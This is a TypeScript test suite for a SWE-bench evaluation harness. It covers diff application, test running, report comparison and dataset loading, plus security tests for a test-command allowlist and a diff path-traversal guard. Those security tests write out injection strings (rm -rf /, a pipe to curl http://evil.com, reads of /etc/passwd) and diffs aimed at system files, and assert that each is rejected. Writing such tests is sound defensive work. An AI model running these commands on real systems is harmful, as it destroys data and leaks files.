/**
 * M143 — SWE-bench evaluation harness tests.
 *
 * Hermetic: zero network. The engine is mocked via dependency injection.
 * exec (applyDiff / runTests) is exercised against real temp dirs with
 * trivial test scripts so we don't need to mock child_process.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';

import {
  runBenchmark,
  compareReports,
  loadSweBenchDataset,
  applyDiff,
  runTests,
  isSafeTestCommand,
  isDiffSafe,
  type BenchTask,
  type BenchReport,
  type EngineRunner,
} from '../src/core/eval/swe-bench.js';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Build a tiny self-contained repo in a temp dir. Returns the dir path. */
function makeRepo(files: Record<string, string>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-m143-'));
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, content);
  }
  return dir;
}

function rmDir(dir: string): void {
  try {
    fs.rmSync(dir, { recursive: true, force: true });
  } catch {
    // ignore
  }
}

// A trivially-passing test script (exits 0).
const PASSING_TEST = "process.exit(0);\n";
// A trivially-failing test script (exits 1).
const FAILING_TEST = "process.exit(1);\n";

// ---------------------------------------------------------------------------
// 1. applyDiff + runTests (real exec, isolated temp dirs)
// ---------------------------------------------------------------------------

describe('applyDiff', () => {
  it('returns true and no-ops for an empty diff', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-diff-'));
    try {
      expect(applyDiff('', dir)).toBe(true);
      expect(applyDiff('   \n', dir)).toBe(true);
    } finally {
      rmDir(dir);
    }
  });

  it('applies a valid unified diff and creates the patched file', () => {
    const dir = makeRepo({ 'hello.txt': 'hello world\n' });
    try {
      const diff = [
        '--- a/hello.txt',
        '+++ b/hello.txt',
        '@@ -1 +1 @@',
        '-hello world',
        '+hello patched',
        '',
      ].join('\n');
      const ok = applyDiff(diff, dir);
      expect(ok).toBe(true);
      // win32: git apply honors core.autocrlf=true (the runner default) and
      // writes CRLF into the working tree — the CONTENT is what we assert.
      expect(fs.readFileSync(path.join(dir, 'hello.txt'), 'utf8').replace(/\r\n/g, '\n')).toBe('hello patched\n');
    } finally {
      rmDir(dir);
    }
  });

  it('returns false for a malformed diff', () => {
    const dir = makeRepo({ 'file.txt': 'original\n' });
    try {
      const ok = applyDiff('this is not a diff', dir);
      expect(ok).toBe(false);
    } finally {
      rmDir(dir);
    }
  });
});

describe('runTests', () => {
  it('returns ok:true when the test command exits 0', () => {
    const dir = makeRepo({ 'test.js': PASSING_TEST });
    try {
      const res = runTests('node test.js', dir);
      expect(res.ok).toBe(true);
    } finally {
      rmDir(dir);
    }
  });

  it('returns ok:false when the test command exits non-zero', () => {
    const dir = makeRepo({ 'test.js': FAILING_TEST });
    try {
      const res = runTests('node test.js', dir);
      expect(res.ok).toBe(false);
    } finally {
      rmDir(dir);
    }
  });

  it('captures stdout/stderr in output', () => {
    const dir = makeRepo({ 'test.js': "console.log('result here'); process.exit(0);\n" });
    try {
      const res = runTests('node test.js', dir);
      expect(res.ok).toBe(true);
      expect(res.output).toContain('result here');
    } finally {
      rmDir(dir);
    }
  });
});

// ---------------------------------------------------------------------------
// 2. runBenchmark with a mocked engine
// ---------------------------------------------------------------------------

describe('runBenchmark — mocked engine', () => {
  let dirs: string[] = [];

  afterEach(() => {
    for (const d of dirs) rmDir(d);
    dirs = [];
  });

  function makeTask(id: string, goldTestCommand: string, passing: boolean): BenchTask {
    const script = passing ? PASSING_TEST : FAILING_TEST;
    const dir = makeRepo({ 'test.js': script });
    dirs.push(dir);
    return {
      id,
      problemStatement: `Fix issue in ${id}`,
      repoPath: dir,
      goldTestCommand,
      failToPassTests: [],
    };
  }

  it('scores resolved=1 when mock engine returns empty diff and test passes', async () => {
    const task = makeTask('task-pass', 'node test.js', true);
    // Empty diff = no patch applied; test already passes.
    const mockRunner: EngineRunner = async () => '';

    const report = await runBenchmark([task], { engine: 'mock', engineRunner: mockRunner });

    expect(report.total).toBe(1);
    expect(report.resolved).toBe(1);
    expect(report.resolveRate).toBe(1);
    expect(report.perTask[0]!.resolved).toBe(true);
    expect(report.perTask[0]!.engine).toBe('mock');
  });

  it('scores resolved=0 when mock engine returns empty diff and test fails', async () => {
    const task = makeTask('task-fail', 'node test.js', false);
    const mockRunner: EngineRunner = async () => '';

    const report = await runBenchmark([task], { engine: 'mock', engineRunner: mockRunner });

    expect(report.total).toBe(1);
    expect(report.resolved).toBe(0);
    expect(report.resolveRate).toBe(0);
    expect(report.perTask[0]!.resolved).toBe(false);
  });

  it('applies a known diff and scores resolved when test then passes', async () => {
    // Start with a failing test script; mock engine returns a diff that rewrites it to pass.
    const dir = makeRepo({ 'test.js': FAILING_TEST });
    dirs.push(dir);
    const task: BenchTask = {
      id: 'task-with-diff',
      problemStatement: 'Fix test.js',
      repoPath: dir,
      goldTestCommand: 'node test.js',
      failToPassTests: [],
    };

    // The diff rewrites test.js to exit 0.
    const mockDiff = [
      '--- a/test.js',
      '+++ b/test.js',
      '@@ -1 +1 @@',
      '-process.exit(1);',
      '+process.exit(0);',
      '',
    ].join('\n');
    const mockRunner: EngineRunner = async () => mockDiff;

    const report = await runBenchmark([task], { engine: 'mock', engineRunner: mockRunner });

    expect(report.total).toBe(1);
    expect(report.resolved).toBe(1);
    expect(report.resolveRate).toBe(1);
    expect(report.perTask[0]!.diff).toBe(mockDiff);
  });

  it('records an error and marks unresolved when engine throws', async () => {
    const task = makeTask('task-engine-err', 'node test.js', true);
    const mockRunner: EngineRunner = async () => {
      throw new Error('engine exploded');
    };

    const report = await runBenchmark([task], { engine: 'mock', engineRunner: mockRunner });

    expect(report.total).toBe(1);
    expect(report.resolved).toBe(0);
    expect(report.perTask[0]!.error).toMatch('engine exploded');
    expect(report.perTask[0]!.resolved).toBe(false);
  });

  it('runs multiple tasks and computes resolveRate correctly', async () => {
    const t1 = makeTask('t1', 'node test.js', true);  // will resolve
    const t2 = makeTask('t2', 'node test.js', false); // will not resolve
    const t3 = makeTask('t3', 'node test.js', true);  // will resolve
    const mockRunner: EngineRunner = async () => '';

    const report = await runBenchmark([t1, t2, t3], { engine: 'mock', engineRunner: mockRunner });

    expect(report.total).toBe(3);
    expect(report.resolved).toBe(2);
    expect(report.resolveRate).toBeCloseTo(2 / 3);
    expect(report.byEngine['mock']!.total).toBe(3);
    expect(report.byEngine['mock']!.resolved).toBe(2);
  });

  it('respects the limit option', async () => {
    const tasks = [
      makeTask('a', 'node test.js', true),
      makeTask('b', 'node test.js', true),
      makeTask('c', 'node test.js', true),
    ];
    const mockRunner: EngineRunner = async () => '';

    const report = await runBenchmark(tasks, { engine: 'mock', engineRunner: mockRunner, limit: 2 });

    expect(report.total).toBe(2);
    expect(report.perTask.map((r) => r.taskId)).toEqual(['a', 'b']);
  });

  it('report has required BenchReport shape fields', async () => {
    const task = makeTask('shape-check', 'node test.js', true);
    const report = await runBenchmark([task], { engine: 'mock', engineRunner: async () => '' });

    expect(typeof report.id).toBe('string');
    expect(typeof report.ts).toBe('string');
    expect(typeof report.engine).toBe('string');
    expect(typeof report.total).toBe('number');
    expect(typeof report.resolved).toBe('number');
    expect(typeof report.resolveRate).toBe('number');
    expect(Array.isArray(report.perTask)).toBe(true);
    expect(typeof report.byEngine).toBe('object');
  });
});

// ---------------------------------------------------------------------------
// 3. compareReports — regression gate
// ---------------------------------------------------------------------------

function makeReport(tasks: Array<{ id: string; resolved: boolean }>, engine = 'mock'): BenchReport {
  const perTask = tasks.map((t) => ({
    taskId: t.id,
    engine,
    resolved: t.resolved,
    diff: '',
    testOutput: '',
    durationMs: 0,
  }));
  const total = perTask.length;
  const resolved = perTask.filter((r) => r.resolved).length;
  const resolveRate = total === 0 ? 0 : resolved / total;
  return {
    id: `bench-${Math.random().toString(36).slice(2)}`,
    ts: new Date().toISOString(),
    engine,
    total,
    resolved,
    resolveRate,
    perTask,
    byEngine: { [engine]: { total, resolved, resolveRate } },
  };
}

describe('compareReports', () => {
  it('detects a regression: lower resolveRate and a newly-broken task', () => {
    const a = makeReport([
      { id: 'task-1', resolved: true },
      { id: 'task-2', resolved: true },
    ]);
    const b = makeReport([
      { id: 'task-1', resolved: true },
      { id: 'task-2', resolved: false }, // regressed
    ]);

    const delta = compareReports(a, b);

    expect(delta.regressed).toBe(true);
    expect(delta.improved).toBe(false);
    expect(delta.newlyBroken).toContain('task-2');
    expect(delta.newlyFixed).toHaveLength(0);
    expect(delta.resolveRateDelta).toBeLessThan(0);
  });

  it('detects an improvement: higher resolveRate and a newly-fixed task', () => {
    const a = makeReport([
      { id: 'task-1', resolved: false },
      { id: 'task-2', resolved: true },
    ]);
    const b = makeReport([
      { id: 'task-1', resolved: true }, // fixed
      { id: 'task-2', resolved: true },
    ]);

    const delta = compareReports(a, b);

    expect(delta.improved).toBe(true);
    expect(delta.regressed).toBe(false);
    expect(delta.newlyFixed).toContain('task-1');
    expect(delta.newlyBroken).toHaveLength(0);
    expect(delta.resolveRateDelta).toBeGreaterThan(0);
  });

  it('detects no change when both reports are identical', () => {
    const a = makeReport([
      { id: 'task-1', resolved: true },
      { id: 'task-2', resolved: false },
    ]);
    const b = makeReport([
      { id: 'task-1', resolved: true },
      { id: 'task-2', resolved: false },
    ]);

    const delta = compareReports(a, b);

    expect(delta.improved).toBe(false);
    expect(delta.regressed).toBe(false);
    expect(delta.newlyBroken).toHaveLength(0);
    expect(delta.newlyFixed).toHaveLength(0);
    expect(delta.resolveRateDelta).toBe(0);
  });

  it('marks regressed=true when resolveRate drops even without newly-broken tasks', () => {
    // a has 2 tasks, b has 1 of the same (the other disappeared) — rate drops.
    const a = makeReport([
      { id: 'task-1', resolved: true },
      { id: 'task-2', resolved: true },
    ]);
    const b = makeReport([
      { id: 'task-1', resolved: true },
      { id: 'task-2', resolved: false },
    ]);
    const delta = compareReports(a, b);
    expect(delta.regressed).toBe(true);
  });

  it('handles empty prior report gracefully', () => {
    const a = makeReport([]);
    const b = makeReport([{ id: 'task-1', resolved: true }]);

    const delta = compareReports(a, b);

    expect(delta.newlyFixed).toContain('task-1');
    expect(delta.newlyBroken).toHaveLength(0);
    expect(delta.improved).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 4. Dataset loader — standard SWE-bench JSONL format
// ---------------------------------------------------------------------------

describe('loadSweBenchDataset', () => {
  let tmpFile: string;

  beforeEach(() => {
    tmpFile = path.join(os.tmpdir(), `ashlr-swe-${Date.now()}.jsonl`);
  });

  afterEach(() => {
    try { fs.unlinkSync(tmpFile); } catch { /* ignore */ }
  });

  const sampleRecords = [
    {
      instance_id: 'django__django-11099',
      problem_statement: 'Fix the bug in QuerySet.filter().',
      repo: 'django/django',
      repo_path: '/repos/django__django',
      test_cmd: 'python -m pytest tests/queryset/',
      FAIL_TO_PASS: '["tests/queryset/test_filter.py::FilterTest::test_basic"]',
    },
    {
      instance_id: 'flask__flask-4444',
      problem_statement: 'Fix request context leak.',
      repo: 'pallets/flask',
      repo_path: '/repos/pallets__flask',
      test_cmd: 'pytest tests/',
      FAIL_TO_PASS: ['tests/test_ctx.py::test_leak'],
    },
  ];

  it('parses a standard SWE-bench JSONL file into BenchTask[]', () => {
    fs.writeFileSync(tmpFile, sampleRecords.map((r) => JSON.stringify(r)).join('\n'));

    const tasks = loadSweBenchDataset(tmpFile);

    expect(tasks).toHaveLength(2);
    expect(tasks[0]!.id).toBe('django__django-11099');
    expect(tasks[0]!.problemStatement).toBe('Fix the bug in QuerySet.filter().');
    expect(tasks[0]!.repoPath).toBe('/repos/django__django');
    expect(tasks[0]!.goldTestCommand).toBe('python -m pytest tests/queryset/');
    expect(tasks[0]!.failToPassTests).toEqual([
      'tests/queryset/test_filter.py::FilterTest::test_basic',
    ]);

    expect(tasks[1]!.id).toBe('flask__flask-4444');
    expect(tasks[1]!.failToPassTests).toEqual(['tests/test_ctx.py::test_leak']);
  });

  it('accepts FAIL_TO_PASS as a JSON string or a native array', () => {
    fs.writeFileSync(
      tmpFile,
      [
        JSON.stringify({ instance_id: 'a', problem_statement: 'p', repo: 'r', repo_path: '/r', test_cmd: 'echo', FAIL_TO_PASS: '["t1","t2"]' }),
        JSON.stringify({ instance_id: 'b', problem_statement: 'p', repo: 'r', repo_path: '/r', test_cmd: 'echo', FAIL_TO_PASS: ['t3'] }),
      ].join('\n'),
    );

    const tasks = loadSweBenchDataset(tmpFile);
    expect(tasks[0]!.failToPassTests).toEqual(['t1', 't2']);
    expect(tasks[1]!.failToPassTests).toEqual(['t3']);
  });

  it('resolves repoPath from repoBasePath when no repo_path field present', () => {
    fs.writeFileSync(
      tmpFile,
      JSON.stringify({ instance_id: 'org__repo-1', problem_statement: 'p', repo: 'org/repo', test_cmd: 'echo', FAIL_TO_PASS: [] }),
    );

    const tasks = loadSweBenchDataset(tmpFile, '/repos');
    // repoPath is a real filesystem path — native separators are correct.
    expect(tasks[0]!.repoPath).toBe(path.join('/repos', 'org__repo'));
  });

  it('skips malformed JSON lines and continues parsing', () => {
    fs.writeFileSync(
      tmpFile,
      [
        '{not valid json',
        JSON.stringify({ instance_id: 'valid', problem_statement: 'ok', repo: 'r', repo_path: '/r', test_cmd: 'echo', FAIL_TO_PASS: [] }),
        '',
      ].join('\n'),
    );

    const tasks = loadSweBenchDataset(tmpFile);
    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.id).toBe('valid');
  });

  it('returns an empty array for an empty JSONL file', () => {
    fs.writeFileSync(tmpFile, '');
    const tasks = loadSweBenchDataset(tmpFile);
    expect(tasks).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Security: HIGH-1 — isSafeTestCommand allowlist + runTests guard
// ---------------------------------------------------------------------------

describe('isSafeTestCommand — allowlist validation', () => {
  it('accepts pytest', () => {
    expect(isSafeTestCommand('pytest tests/')).toBe(true);
  });

  it('accepts python -m pytest', () => {
    expect(isSafeTestCommand('python -m pytest tests/queryset/')).toBe(true);
  });

  it('accepts npm test', () => {
    expect(isSafeTestCommand('npm test')).toBe(true);
  });

  it('accepts npm run test', () => {
    expect(isSafeTestCommand('npm run test')).toBe(true);
  });

  it('accepts yarn test', () => {
    expect(isSafeTestCommand('yarn test')).toBe(true);
  });

  it('accepts cargo test', () => {
    expect(isSafeTestCommand('cargo test')).toBe(true);
  });

  it('accepts go test', () => {
    expect(isSafeTestCommand('go test ./...')).toBe(true);
  });

  it('accepts vitest', () => {
    expect(isSafeTestCommand('vitest run')).toBe(true);
  });

  it('accepts jest', () => {
    expect(isSafeTestCommand('jest --testPathPattern=foo')).toBe(true);
  });

  it('rejects semicolon injection', () => {
    expect(isSafeTestCommand('pytest tests/; rm -rf /')).toBe(false);
  });

  it('rejects pipe injection', () => {
    expect(isSafeTestCommand('pytest tests/ | curl http://evil.com')).toBe(false);
  });

  it('rejects ampersand injection', () => {
    expect(isSafeTestCommand('pytest tests/ & whoami')).toBe(false);
  });

  it('rejects $() command substitution', () => {
    expect(isSafeTestCommand('pytest $(cat /etc/passwd)')).toBe(false);
  });

  it('rejects backtick command substitution', () => {
    expect(isSafeTestCommand('pytest `whoami`')).toBe(false);
  });

  it('rejects > redirect', () => {
    expect(isSafeTestCommand('pytest tests/ > /tmp/out')).toBe(false);
  });

  it('rejects < redirect', () => {
    expect(isSafeTestCommand('pytest < /etc/passwd')).toBe(false);
  });

  it('rejects ../ path traversal in command', () => {
    expect(isSafeTestCommand('pytest ../../etc/passwd')).toBe(false);
  });

  it('rejects newline injection', () => {
    expect(isSafeTestCommand('pytest tests/\nrm -rf /')).toBe(false);
  });

  it('rejects unknown binary', () => {
    expect(isSafeTestCommand('bash run_tests.sh')).toBe(false);
  });

  it('rejects arbitrary shell command', () => {
    expect(isSafeTestCommand('curl http://evil.com')).toBe(false);
  });
});

describe('runTests — unsafe command rejected without execution', () => {
  it('returns ok:false and "unsafe test command rejected" for shell metacharacter command', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-safe-'));
    try {
      const res = runTests('pytest tests/; rm -rf /tmp/canary', dir);
      expect(res.ok).toBe(false);
      expect(res.output).toBe('unsafe test command rejected');
    } finally {
      try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ok */ }
    }
  });

  it('returns ok:false and "unsafe test command rejected" for unlisted binary', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-safe2-'));
    try {
      const res = runTests('bash attack.sh', dir);
      expect(res.ok).toBe(false);
      expect(res.output).toBe('unsafe test command rejected');
    } finally {
      try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ok */ }
    }
  });
});

// ---------------------------------------------------------------------------
// Security: HIGH-2 — isDiffSafe + applyDiff path-traversal guard
// ---------------------------------------------------------------------------

describe('isDiffSafe — diff path validation', () => {
  it('accepts a normal relative-path diff', () => {
    const diff = [
      '--- a/src/math.js',
      '+++ b/src/math.js',
      '@@ -1 +1 @@',
      '-old',
      '+new',
    ].join('\n');
    expect(isDiffSafe(diff)).toBe(true);
  });

  it('rejects diff with absolute path in --- header', () => {
    const diff = [
      '--- /etc/passwd',
      '+++ /etc/passwd',
      '@@ -1 +1 @@',
      '-root:x:0:0:root',
      '+evil',
    ].join('\n');
    expect(isDiffSafe(diff)).toBe(false);
  });

  it('rejects diff with ../ traversal in +++ header', () => {
    const diff = [
      '--- a/src/file.ts',
      '+++ b/../../../etc/cron.d/evil',
      '@@ -1 +1 @@',
      '-x',
      '+y',
    ].join('\n');
    expect(isDiffSafe(diff)).toBe(false);
  });

  it('rejects diff with ../ in diff --git line', () => {
    const diff = 'diff --git a/../escape/file.ts b/../escape/file.ts\n--- a/../escape/file.ts\n+++ b/../escape/file.ts\n';
    expect(isDiffSafe(diff)).toBe(false);
  });
});

describe('applyDiff — traversal rejection', () => {
  it('returns "traversal-rejected" for a diff with absolute paths', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-trav-'));
    try {
      const diff = [
        '--- /etc/passwd',
        '+++ /etc/passwd',
        '@@ -1 +1 @@',
        '-root',
        '+evil',
        '',
      ].join('\n');
      const result = applyDiff(diff, dir);
      expect(result).toBe('traversal-rejected');
    } finally {
      try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ok */ }
    }
  });

  it('returns "traversal-rejected" for a diff with ../ in path', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-trav2-'));
    try {
      const diff = [
        '--- a/../../escape.ts',
        '+++ b/../../escape.ts',
        '@@ -1 +1 @@',
        '-x',
        '+y',
        '',
      ].join('\n');
      const result = applyDiff(diff, dir);
      expect(result).toBe('traversal-rejected');
    } finally {
      try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ok */ }
    }
  });
});

// ---------------------------------------------------------------------------
// Security: LOW-2 — repo_path validation in loadSweBenchDataset
// ---------------------------------------------------------------------------

describe('loadSweBenchDataset — repo_path validation (LOW-2)', () => {
  let tmpFile: string;

  beforeEach(() => {
    tmpFile = path.join(os.tmpdir(), `ashlr-sec-${Date.now()}.jsonl`);
  });

  afterEach(() => {
    try { fs.unlinkSync(tmpFile); } catch { /* ok */ }
  });

  it('accepts a task with an absolute repo_path (no repoBasePath)', () => {
    fs.writeFileSync(
      tmpFile,
      JSON.stringify({ instance_id: 'a', problem_statement: 'p', repo: 'r', repo_path: '/repos/myrepo', test_cmd: 'pytest', FAIL_TO_PASS: [] }),
    );
    const tasks = loadSweBenchDataset(tmpFile);
    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.repoPath).toBe('/repos/myrepo');
  });

  it('rejects a task with a relative repo_path', () => {
    fs.writeFileSync(
      tmpFile,
      JSON.stringify({ instance_id: 'b', problem_statement: 'p', repo: 'r', repo_path: 'relative/path', test_cmd: 'pytest', FAIL_TO_PASS: [] }),
    );
    const tasks = loadSweBenchDataset(tmpFile);
    expect(tasks).toHaveLength(0);
  });

  it('rejects a task with ../ traversal outside repoBasePath', () => {
    fs.writeFileSync(
      tmpFile,
      JSON.stringify({ instance_id: 'c', problem_statement: 'p', repo: 'r', repo_path: '/repos/../etc/evil', test_cmd: 'pytest', FAIL_TO_PASS: [] }),
    );
    const tasks = loadSweBenchDataset(tmpFile, '/repos');
    expect(tasks).toHaveLength(0);
  });

  it('accepts a task whose resolved repo_path is inside repoBasePath', () => {
    fs.writeFileSync(
      tmpFile,
      JSON.stringify({ instance_id: 'd', problem_statement: 'p', repo: 'org/project', test_cmd: 'pytest', FAIL_TO_PASS: [] }),
    );
    const tasks = loadSweBenchDataset(tmpFile, '/repos');
    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.repoPath).toBe('/repos/org__project');
  });
});

// ---------------------------------------------------------------------------
// 5. Bundled fixture task integration (no mock — runs real node tests)
// ---------------------------------------------------------------------------

describe('bundled fixture tasks via runBenchmark', () => {
  it('runs fixture task fix-add-off-by-one: unresolved without fix, resolved with correct diff', async () => {
    // Build the buggy repo inline (same logic as loadFixtureTasks).
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ashlr-fix-add-'));
    try {
      fs.mkdirSync(path.join(dir, 'src'));
      fs.writeFileSync(
        path.join(dir, 'src', 'math.js'),
        'function add(a, b) { return a + b + 1; }\nmodule.exports = { add };\n',
      );
      fs.writeFileSync(
        path.join(dir, 'test.js'),
        [
          "const { add } = require('./src/math.js');",
          "if (add(2, 3) !== 5) { console.error('FAIL'); process.exit(1); }",
          "console.log('PASS'); process.exit(0);",
        ].join('\n'),
      );

      const task: BenchTask = {
        id: 'fix-add-off-by-one',
        problemStatement: 'Fix the off-by-one in add()',
        repoPath: dir,
        goldTestCommand: 'node test.js',
        failToPassTests: ['test_add_basic'],
      };

      // No fix applied (empty diff) → should fail.
      const noFixReport = await runBenchmark([task], {
        engine: 'mock-no-fix',
        engineRunner: async () => '',
      });
      expect(noFixReport.perTask[0]!.resolved).toBe(false);

      // Correct fix applied → should pass.
      const fixDiff = [
        '--- a/src/math.js',
        '+++ b/src/math.js',
        '@@ -1,2 +1,2 @@',
        '-function add(a, b) { return a + b + 1; }',
        '+function add(a, b) { return a + b; }',
        ' module.exports = { add };',
        '',
      ].join('\n');

      const fixReport = await runBenchmark([task], {
        engine: 'mock-fix',
        engineRunner: async () => fixDiff,
      });
      expect(fixReport.perTask[0]!.resolved).toBe(true);
      expect(fixReport.resolveRate).toBe(1);
    } finally {
      rmDir(dir);
    }
  });
});
